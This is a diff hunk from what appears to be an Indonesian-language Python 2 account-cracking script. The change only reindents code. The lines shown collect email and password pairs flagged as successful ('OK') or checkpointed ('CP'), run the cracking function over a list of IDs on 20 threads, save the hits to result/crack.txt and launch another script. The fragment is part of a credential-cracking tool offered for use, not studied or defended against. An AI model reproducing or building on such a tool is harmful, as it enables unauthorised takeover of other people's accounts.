@@ -298,17 +298,17 @@ def main(arg):
                                                                         cek.write('\n   [CP] '+em+' | '+pw8+' | '+bt)
                                                                         cek.close()
                                                                         cekpoint.append(em)
-	except:
-		pass
-	p = ThreadPool(20)
-	p.map(main, id)
-	print ("─────────────────────────────────────────────────────────────")
-	print ("   [•] Crack Selesai")
-	print"   [•] Total OK/CP : "+str(len(oks))+"/"+str(len(cekpoint))
-	print '   [•] Hasil OK/CP Tersimpan Di : result/crack.txt'
-	print ("─────────────────────────────────────────────────────────────")
-	raw_input(" [Kembali]")
-	os.system("python2 exclusive.py")
+    except:
+        pass
+    p = ThreadPool(20)
+    p.map(main, id)
+    print ("─────────────────────────────────────────────────────────────")
+    print ("   [•] Crack Selesai")
+    print"   [•] Total OK/CP : "+str(len(oks))+"/"+str(len(cekpoint))
+    print '   [•] Hasil OK/CP Tersimpan Di : result/crack.txt'
+    print ("─────────────────────────────────────────────────────────────")
+    raw_input(" [Kembali]")
+    os.system("python2 exclusive.py")
 
 if __name__=='__main__':
 	menu()
